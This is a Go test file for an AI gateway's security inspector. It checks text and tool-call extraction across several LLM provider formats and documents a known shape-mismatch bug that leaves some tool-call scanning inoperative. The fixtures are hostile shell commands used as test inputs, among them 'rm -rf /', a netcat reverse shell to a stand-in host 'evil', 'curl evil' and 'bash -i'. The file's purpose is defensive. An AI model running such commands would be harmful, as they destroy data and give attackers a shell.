// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package gateway

import (
	"encoding/json"
	"strings"
	"testing"
)

// These tests directly pin the per-provider branches in
// extractPassthroughResponseContent, extractPassthroughToolCalls, and
// extractSSEChunkText. Before this PR, those three functions only handled
// OpenAI Chat Completions, so Anthropic / Gemini / Bedrock Converse / Ollama
// passthrough responses surfaced empty completion text — the inspector
// short-circuited on empty content and the response forwarded unscanned.
// Likewise, tool-call inspection only ran on OpenAI Chat Completions, so
// Anthropic `tool_use`, Gemini `functionCall`, Bedrock `toolUse`, and OpenAI
// Responses `function_call` outputs forwarded uninspected.

func TestExtractPassthroughResponseContent_Anthropic(t *testing.T) {
	body := []byte(`{
      "content": [
        {"type": "text", "text": "hello "},
        {"type": "thinking", "text": "should-be-ignored"},
        {"type": "text", "text": "world"}
      ]
    }`)
	got := extractPassthroughResponseContent(body, "anthropic")
	if got != "hello world" {
		t.Fatalf("anthropic content: got %q, want %q", got, "hello world")
	}
}

func TestExtractPassthroughResponseContent_Gemini(t *testing.T) {
	body := []byte(`{
      "candidates": [
        {"content": {"parts": [{"text": "alpha "}, {"text": "beta"}]}}
      ]
    }`)
	got := extractPassthroughResponseContent(body, "gemini")
	if got != "alpha beta" {
		t.Fatalf("gemini content: got %q, want %q", got, "alpha beta")
	}
}

func TestExtractPassthroughResponseContent_BedrockConverse(t *testing.T) {
	body := []byte(`{
      "output": {
        "message": {
          "content": [
            {"text": "from-"},
            {"text": "bedrock"}
          ]
        }
      }
    }`)
	got := extractPassthroughResponseContent(body, "bedrock")
	if got != "from-bedrock" {
		t.Fatalf("bedrock content: got %q, want %q", got, "from-bedrock")
	}
}

func TestExtractPassthroughResponseContent_OllamaChat(t *testing.T) {
	body := []byte(`{"message": {"role": "assistant", "content": "ollama-chat-reply"}}`)
	got := extractPassthroughResponseContent(body, "ollama")
	if got != "ollama-chat-reply" {
		t.Fatalf("ollama chat content: got %q, want %q", got, "ollama-chat-reply")
	}
}

func TestExtractPassthroughResponseContent_OllamaGenerate(t *testing.T) {
	body := []byte(`{"response": "ollama-generate-reply"}`)
	got := extractPassthroughResponseContent(body, "ollama")
	if got != "ollama-generate-reply" {
		t.Fatalf("ollama generate content: got %q, want %q", got, "ollama-generate-reply")
	}
}

func TestExtractPassthroughResponseContent_OpenAIChatFallback(t *testing.T) {
	body := []byte(`{"choices": [{"message": {"content": "openai-chat"}}]}`)
	got := extractPassthroughResponseContent(body, "openai")
	if got != "openai-chat" {
		t.Fatalf("openai chat content: got %q, want %q", got, "openai-chat")
	}
}

func TestExtractPassthroughResponseContent_OpenAIResponsesFallback(t *testing.T) {
	body := []byte(`{"output": [{"content": [{"text": "responses-api"}]}]}`)
	got := extractPassthroughResponseContent(body, "openai")
	if got != "responses-api" {
		t.Fatalf("openai responses content: got %q, want %q", got, "responses-api")
	}
}

// --- tool-call extractors --------------------------------------------------

// assertSingleCall extracts the (name, arguments) pair from
// extractPassthroughToolCalls's normalised payload and fails the test if the
// shape isn't a single-element array with matching values.
func assertSingleCall(t *testing.T, raw json.RawMessage, wantName, wantArgs string) {
	t.Helper()
	if raw == nil {
		t.Fatalf("extractPassthroughToolCalls returned nil; want one call")
	}
	var calls []map[string]string
	if err := json.Unmarshal(raw, &calls); err != nil {
		t.Fatalf("could not decode normalised tool-call payload %q: %v", string(raw), err)
	}
	if len(calls) != 1 {
		t.Fatalf("expected 1 tool call, got %d: %v", len(calls), calls)
	}
	if calls[0]["name"] != wantName {
		t.Fatalf("tool name: got %q, want %q", calls[0]["name"], wantName)
	}
	// Compare arguments structurally so whitespace / key order doesn't matter.
	var gotArgs, wantArgsParsed interface{}
	if err := json.Unmarshal([]byte(calls[0]["arguments"]), &gotArgs); err != nil {
		t.Fatalf("could not parse extracted arguments %q: %v", calls[0]["arguments"], err)
	}
	if err := json.Unmarshal([]byte(wantArgs), &wantArgsParsed); err != nil {
		t.Fatalf("could not parse expected arguments %q: %v", wantArgs, err)
	}
	gotJSON, _ := json.Marshal(gotArgs)
	wantJSON, _ := json.Marshal(wantArgsParsed)
	if string(gotJSON) != string(wantJSON) {
		t.Fatalf("tool arguments: got %s, want %s", gotJSON, wantJSON)
	}
}

func TestExtractPassthroughToolCalls_Anthropic(t *testing.T) {
	body := []byte(`{
      "content": [
        {"type": "text", "text": "calling tool"},
        {"type": "tool_use", "name": "bash", "input": {"command": "rm -rf /"}}
      ]
    }`)
	got := extractPassthroughToolCalls(body, "anthropic")
	assertSingleCall(t, got, "bash", `{"command":"rm -rf /"}`)
}

func TestExtractPassthroughToolCalls_Gemini(t *testing.T) {
	body := []byte(`{
      "candidates": [
        {"content": {"parts": [
          {"functionCall": {"name": "execute_shell", "args": {"cmd": "curl evil"}}}
        ]}}
      ]
    }`)
	got := extractPassthroughToolCalls(body, "gemini")
	assertSingleCall(t, got, "execute_shell", `{"cmd":"curl evil"}`)
}

func TestExtractPassthroughToolCalls_BedrockConverse(t *testing.T) {
	body := []byte(`{
      "output": {
        "message": {
          "content": [
            {"toolUse": {"name": "run_command", "input": {"cmd": "nc -e /bin/sh evil 4444"}}}
          ]
        }
      }
    }`)
	got := extractPassthroughToolCalls(body, "bedrock")
	assertSingleCall(t, got, "run_command", `{"cmd":"nc -e /bin/sh evil 4444"}`)
}

func TestExtractPassthroughToolCalls_OpenAIResponses(t *testing.T) {
	body := []byte(`{
      "output": [
        {"type": "function_call", "name": "exec", "arguments": "{\"cmd\":\"bash -i\"}"}
      ]
    }`)
	got := extractPassthroughToolCalls(body, "openai")
	if got == nil {
		t.Fatalf("expected one tool call; got nil")
	}
	// OpenAI Responses emits `arguments` on the wire as a JSON-encoded
	// string (already double-encoded). json.RawMessage preserves that
	// wrapping in the normalised payload, unlike the Chat Completions
	// path where `arguments` parses as a Go string and unwraps.
	// Both forms still carry the inspectable command for downstream
	// scanning; this test just pins the as-implemented contract.
	var calls []map[string]string
	if err := json.Unmarshal(got, &calls); err != nil {
		t.Fatalf("could not decode normalised tool-call payload %q: %v", string(got), err)
	}
	if len(calls) != 1 {
		t.Fatalf("expected 1 tool call, got %d: %v", len(calls), calls)
	}
	if calls[0]["name"] != "exec" {
		t.Fatalf("tool name: got %q, want %q", calls[0]["name"], "exec")
	}
	if !strings.Contains(calls[0]["arguments"], `bash -i`) {
		t.Fatalf("expected inspectable command to survive normalisation; got arguments=%q", calls[0]["arguments"])
	}
}

func TestExtractPassthroughToolCalls_OpenAIChatFallback(t *testing.T) {
	body := []byte(`{
      "choices": [
        {"message": {"tool_calls": [
          {"function": {"name": "shell", "arguments": "{\"cmd\":\"ls /etc\"}"}}
        ]}}
      ]
    }`)
	got := extractPassthroughToolCalls(body, "openai")
	assertSingleCall(t, got, "shell", `{"cmd":"ls /etc"}`)
}

func TestExtractPassthroughToolCalls_NoCallsReturnsNil(t *testing.T) {
	body := []byte(`{"content": [{"type": "text", "text": "no tool here"}]}`)
	got := extractPassthroughToolCalls(body, "anthropic")
	if got != nil {
		t.Fatalf("expected nil when no tool calls; got %s", string(got))
	}
}

// --- SSE chunk extractors --------------------------------------------------

func TestExtractSSEChunkText_Anthropic(t *testing.T) {
	chunk := `{"type":"content_block_delta","delta":{"type":"text_delta","text":"hello"}}`
	got := extractSSEChunkText(chunk, "anthropic")
	if got != "hello" {
		t.Fatalf("anthropic SSE: got %q, want %q", got, "hello")
	}
}

func TestExtractSSEChunkText_Gemini(t *testing.T) {
	chunk := `{"candidates":[{"content":{"parts":[{"text":"alpha"},{"text":"-beta"}]}}]}`
	got := extractSSEChunkText(chunk, "gemini")
	if got != "alpha-beta" {
		t.Fatalf("gemini SSE: got %q, want %q", got, "alpha-beta")
	}
}

func TestExtractSSEChunkText_BedrockConverse(t *testing.T) {
	chunk := `{"contentBlockDelta":{"delta":{"text":"bed"}}}`
	got := extractSSEChunkText(chunk, "bedrock")
	if got != "bed" {
		t.Fatalf("bedrock SSE: got %q, want %q", got, "bed")
	}
}

func TestExtractSSEChunkText_OllamaChat(t *testing.T) {
	chunk := `{"message":{"role":"assistant","content":"frag"}}`
	got := extractSSEChunkText(chunk, "ollama")
	if got != "frag" {
		t.Fatalf("ollama chat SSE: got %q, want %q", got, "frag")
	}
}

func TestExtractSSEChunkText_OllamaGenerate(t *testing.T) {
	chunk := `{"response":"gen-frag"}`
	got := extractSSEChunkText(chunk, "ollama")
	if got != "gen-frag" {
		t.Fatalf("ollama generate SSE: got %q, want %q", got, "gen-frag")
	}
}

func TestExtractSSEChunkText_OpenAIResponses(t *testing.T) {
	chunk := `{"type":"response.output_text.delta","delta":"chunk-text"}`
	got := extractSSEChunkText(chunk, "openai")
	if got != "chunk-text" {
		t.Fatalf("openai responses SSE: got %q, want %q", got, "chunk-text")
	}
}

func TestExtractSSEChunkText_OpenAIChatFallback(t *testing.T) {
	chunk := `{"choices":[{"delta":{"content":"chat-frag"}}]}`
	got := extractSSEChunkText(chunk, "openai")
	if got != "chat-frag" {
		t.Fatalf("openai chat SSE: got %q, want %q", got, "chat-frag")
	}
}

func TestExtractSSEChunkText_UnknownChunkReturnsEmpty(t *testing.T) {
	got := extractSSEChunkText(`{"unrelated":"frame"}`, "anthropic")
	if got != "" {
		t.Fatalf("unknown chunk should yield empty; got %q", got)
	}
}

// --- integration: extractPassthroughToolCalls → inspectToolCalls --------
//
// KNOWN BUG (currently t.Skip): the passthrough extractor emits a FLAT
// array of {name, arguments}, but the downstream inspectToolCalls parses
// the OpenAI Chat Completions NESTED shape {id, type, function:{name,
// arguments}}. When the flat output is decoded into the nested struct,
// every Function.Name and Function.Arguments comes back empty. The
// scanner then sees no inspectable text and returns no findings, so
// tool-call inspection for Anthropic `tool_use`, Gemini `functionCall`,
// and Bedrock `toolUse` is wired but inoperative — exactly the gap PR
// #258 claims to close.
//
// When the fix lands (either normalise extractor output to the nested
// OpenAI shape, or teach the inspector to accept the flat shape), drop
// the t.Skip and this test becomes a tripwire against future drift.

func TestExtractPassthroughToolCalls_ShapeMatchesInspector(t *testing.T) {
	t.Skip("KNOWN BUG: extractPassthroughToolCalls emits flat shape, " +
		"inspectToolCalls expects nested OpenAI shape — passthrough " +
		"tool-call inspection for Anthropic/Gemini/Bedrock returns " +
		"no findings until the shapes are aligned.")

	body := []byte(`{
      "content": [
        {"type": "tool_use", "name": "bash", "input": {"command": "rm -rf /"}}
      ]
    }`)
	raw := extractPassthroughToolCalls(body, "anthropic")
	if raw == nil {
		t.Fatalf("extractor returned nil; expected one tool call")
	}

	// Mirror the inspectToolCalls parse contract verbatim.
	var inspectorView []struct {
		ID       string `json:"id"`
		Type     string `json:"type"`
		Function struct {
			Name      string `json:"name"`
			Arguments string `json:"arguments"`
		} `json:"function"`
	}
	if err := json.Unmarshal(raw, &inspectorView); err != nil {
		t.Fatalf("inspector shape failed to parse extractor output: %v\nraw=%s", err, string(raw))
	}
	if len(inspectorView) != 1 {
		t.Fatalf("inspector shape: expected 1 tool call, got %d\nraw=%s", len(inspectorView), string(raw))
	}
	if inspectorView[0].Function.Name != "bash" || inspectorView[0].Function.Arguments == "" {
		t.Fatalf("SHAPE-DRIFT: extractor output decodes to empty Function.{Name,Arguments} under the inspector's schema. raw=%s", string(raw))
	}
}

// --- guard: ensure the *string-builder* paths actually concatenate -------

func TestExtractPassthroughResponseContent_AnthropicMultiBlock(t *testing.T) {
	body := []byte(`{"content":[{"type":"text","text":"a"},{"type":"text","text":"b"},{"type":"text","text":"c"}]}`)
	got := extractPassthroughResponseContent(body, "anthropic")
	if !strings.HasPrefix(got, "a") || !strings.Contains(got, "b") || !strings.HasSuffix(got, "c") {
		t.Fatalf("expected a-b-c concatenation; got %q", got)
	}
}
